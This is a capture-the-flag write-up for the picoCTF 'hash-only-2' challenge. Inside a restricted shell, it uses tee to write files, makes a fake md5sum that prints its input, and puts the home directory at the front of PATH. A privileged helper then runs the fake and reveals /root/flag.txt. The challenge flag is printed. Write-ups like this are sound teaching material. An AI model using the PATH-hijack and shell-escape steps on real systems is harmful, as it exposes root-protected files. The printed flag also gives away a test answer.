# hash-only-2

Compared to [hash-only-1](../hash-only-1/README.md), there are some restrictions in the server.
- can't send files to the server
- can't use some commands 

```
ctf-player@pico-chall$ cd ..
-rbash: cd: restricted
ctf-player@pico-chall$ echo "test" > md5sum
-rbash: md5sum: restricted: cannot redirect output
ctf-player@pico-chall$ export PATH=/home/ctf-player:$PATH
-rbash: PATH: readonly variable
```

However, I found that I can put contents to files by using the `tee` command.

```
# replace md5sum the same as hash-only-1
ctf-player@pico-chall$ echo '#!/bin/bash' | tee md5sum
ctf-player@pico-chall$ echo 'cat "$@"' | tee -a md5sum

# export PATH and execute flaghasher in a script
ctf-player@pico-chall$ echo '#!/bin/bash' | tee exploit
ctf-player@pico-chall$ echo 'export PATH="/home/ctf-player:$PATH"' | tee -a exploit
ctf-player@pico-chall$ echo '/usr/local/bin/flaghasher' | tee -a exploit

ctf-player@pico-chall$ sh exploit
Computing the MD5 hash of /root/flag.txt.... 

picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_aeecb174}
```
